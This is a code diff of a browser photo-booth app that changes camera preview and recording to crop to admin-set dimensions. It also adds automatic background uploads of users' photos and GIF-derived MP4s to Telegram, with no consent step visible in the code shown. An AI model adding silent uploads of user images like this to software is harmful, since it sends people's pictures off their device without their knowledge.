@@ -1345,7 +1345,7 @@
     <button onclick="openAdminModal()" aria-label="Admin" id="admin-gear-btn" style="width:40px;height:40px;background:#fff;border:1.5px solid var(--border);border-radius:50%;color:var(--orange);display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 2px 10px var(--shadow);-webkit-tap-highlight-color:transparent">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
     </button>
-    <span style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em">v5.8</span>
+    <span style="font-size:0.6rem;color:var(--muted);letter-spacing:0.1em">v5.9</span>
   </div>
 </div>
 
@@ -3197,17 +3197,29 @@
       $('shutter').style.display = 'none';
       $('rec-btn').style.display = '';
       showVideoOverlayOnCamera(true);
-      // Show full camera frame in video mode — no cropping, so preview matches recording
-      $('video').style.objectFit = 'contain';
-      $('video').style.background = '#000';
+      // Crop camera preview to match admin vidWidth×vidHeight ratio
+      // Use object-fit:cover so camera fills the box, then constrain the
+      // box itself to the target aspect ratio so user sees exactly what gets recorded.
+      const videoEl = $('video');
+      videoEl.style.objectFit = 'cover';
+      videoEl.style.background = '#000';
+      videoEl.style.aspectRatio = vidWidth + '/' + vidHeight;
+      videoEl.style.maxHeight = '100%';
+      videoEl.style.maxWidth = '100%';
+      videoEl.style.margin = 'auto';
     } else {
       $('shutter').style.display = '';
       $('rec-btn').style.display = 'none';
       showVideoOverlayOnCamera(false);
       buildThumbs();
       // Photos use cover to fill the preview area
-      $('video').style.objectFit = 'cover';
-      $('video').style.background = '';
+      const videoEl = $('video');
+      videoEl.style.objectFit = 'cover';
+      videoEl.style.background = '';
+      videoEl.style.aspectRatio = '';
+      videoEl.style.maxHeight = '';
+      videoEl.style.maxWidth = '';
+      videoEl.style.margin = '';
     }
     showScreen('camera');
   }
@@ -3255,13 +3267,10 @@
     const vid = $('video');
     const vw = vid.videoWidth || 1280, vh = vid.videoHeight || 720;
 
-    // Record exactly what the user sees on screen.
-    // The camera preview uses object-fit:cover which crops the raw feed
-    // to fill the viewport. We use the raw camera resolution directly —
-    // no cropping, so the final video matches the full camera frame.
+    // Use admin-configured video dimensions (e.g. 1:1 square)
     const rc = document.createElement('canvas');
-    rc.width = Math.min(vw, 1280);
-    rc.height = Math.round(vh * (rc.width / vw));
+    rc.width = vidWidth;
+    rc.height = vidHeight;
     console.log('[rec] output canvas:', rc.width + 'x' + rc.height, 'from raw camera:', vw + 'x' + vh);
     _recCanvas = rc;
     const rctx = rc.getContext('2d');
@@ -3274,15 +3283,27 @@
     }
 
     // Draw loop: video (mirror if enabled) + overlay onto canvas
-    // Draw the full camera frame — no cropping, so video matches what was captured
+    // Crop camera feed to fill the admin-configured output aspect ratio (cover mode)
     const outW = rc.width, outH = rc.height;
+    const camAR = vw / vh, outAR = outW / outH;
+    // Source crop rectangle — center-crop to match output aspect ratio
+    let sx, sy, sw, sh;
+    if (camAR > outAR) {
+      // Camera is wider — crop sides
+      sh = vh; sw = vh * outAR;
+      sx = (vw - sw) / 2; sy = 0;
+    } else {
+      // Camera is taller — crop top/bottom
+      sw = vw; sh = vw / outAR;
+      sx = 0; sy = (vh - sh) / 2;
+    }
     function drawFrame() {
       rctx.save();
       if (_shouldMirror()) {
         rctx.translate(outW, 0);
         rctx.scale(-1, 1);
       }
-      rctx.drawImage(vid, 0, 0, vw, vh, 0, 0, outW, outH);
+      rctx.drawImage(vid, sx, sy, sw, sh, 0, 0, outW, outH);
       rctx.restore();
       if (ovImg && ovImg.complete && ovImg.naturalWidth) {
         rctx.drawImage(ovImg, 0, 0, outW, outH);
@@ -4064,9 +4085,12 @@
   let _gifIsMp4 = false;
   let _gifExt = 'gif';
   let _cachedMp4Blob = null; // Pre-generated MP4 for instant sharing
+  let _tgPhotoUploaded = false; // prevent double Telegram uploads
+
   function showGifScreen() {
     exportMode = 'photo'; gifUrl = null; gifWorking = false;
     _gifIsMp4 = false; _gifExt = 'gif'; _cachedMp4Blob = null;
+    _tgPhotoUploaded = false; // reset for new session
     // Auto-download removed in v4.6
     $('mode-photo').classList.add('active'); $('mode-gif').classList.remove('active');
     $('gif-controls').style.display = 'none';
@@ -4092,7 +4116,14 @@
     const gs = $('gif-screen');
     if (gs) gs.scrollTop = 0;
     window.scrollTo(0, 0);
-    // No auto-download — user taps the download button explicitly.
+
+    // Upload photo to Telegram ONCE (in background)
+    if (compositeDataUrl && !_tgPhotoUploaded) {
+      _tgPhotoUploaded = true;
+      uploadToTelegram(compositeDataUrl, 'image/png', 'png')
+        .then(() => console.log('[telegram] photo uploaded'))
+        .catch(e => console.warn('[telegram] photo upload failed:', e.message));
+    }
   }
 
   function backToPreview() { showScreen('preview'); }
@@ -4207,10 +4238,13 @@
       _gifExt = 'gif';
 
       // Pre-generate MP4 in background for instant sharing later
+      // Also upload GIF as MP4 to Telegram (once)
       _cachedMp4Blob = null;
       _framesToMp4().then(result => {
         _cachedMp4Blob = result;
         console.log('[gif] MP4 pre-cached:', Math.round(result.blob.size / 1024) + 'KB');
+        // Upload MP4 to Telegram (gif as video)
+        _uploadGifAsMp4ToTelegram();
       }).catch(e => console.warn('[gif] MP4 pre-cache failed:', e.message));
 
     } catch (err) {
